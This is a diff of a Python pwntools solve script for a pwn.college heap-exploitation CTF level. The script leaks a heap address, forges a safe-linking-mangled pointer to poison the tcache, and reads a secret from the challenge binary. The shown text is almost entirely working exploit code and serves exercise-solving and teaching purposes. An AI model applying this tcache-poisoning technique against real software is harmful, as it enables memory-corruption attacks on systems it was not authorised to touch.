@@ -1,9 +1,8 @@
-# Seeking Safe Secrets
+# Dynamic Allocator Misuse - Seeking Safe Secrets (Easy)
+# https://pwn.college/program-security/dynamic-allocator-misuse/level-16-0
 import pwn
-from dojotool import find_challenge
+from dojotool import find_challenge, protect_ptr
 from dojotool.pwntool import tee
-
-pwn.context.update(arch="amd64", os="linux", terminal=["tmux", "new-window"])
 
 
 def one_round(io: pwn.process):
@@ -24,26 +23,20 @@ def one_round(io: pwn.process):
         io.sendline(b"scanf %d" % idx)
         io.sendline(data)
 
-    def protect_ptr(pos: int, ptr: int) -> int:
-        return (pos >> 12) ^ ptr
-
-    def reveal_ptr(pos: int, ptr: int) -> int:
-        return protect_ptr(pos, ptr)
-
-    io.sendline(b"malloc 0 16")
-    io.sendline(b"free 0")
-    heap = read_byte(0) << 12  # page aligned
     io.sendline(b"malloc 0 16")
     io.sendline(b"malloc 1 16")
     io.sendline(b"free 1")
     io.sendline(b"free 0")
-    scanf(0, pwn.p64(protect_ptr(heap, secret_addr)))  # 把要访问的地址编码后写入
+    heap = read_byte(1) << 12  # last 12 bits is unknown, but irrelevant
+    secret_mangled = protect_ptr(heap, secret_addr)
+    scanf(0, pwn.p64(secret_mangled))  # 把要访问的地址编码后写入
     io.sendline(b"malloc 0 16")
-    io.sendline(b"malloc 1 16")
+    io.sendline(b"malloc 1 16")  # will be discard
     io.sendline(b"free 0")
 
-    secret1 = reveal_ptr(heap, read_byte(0))  # 是个 heap 上的地址
-    secret1 = reveal_ptr(secret_addr, secret1)  # 是个 bss 上的地址
+    mangled = read_byte(0)
+    secret1 = protect_ptr(heap, mangled)  # 是个 heap 上的地址
+    secret1 = protect_ptr(secret_addr, secret1)  # 是个 bss 上的地址
     secret1 = pwn.p64(secret1)
     secret2 = pwn.p64(0)  # key will be zeroed
 
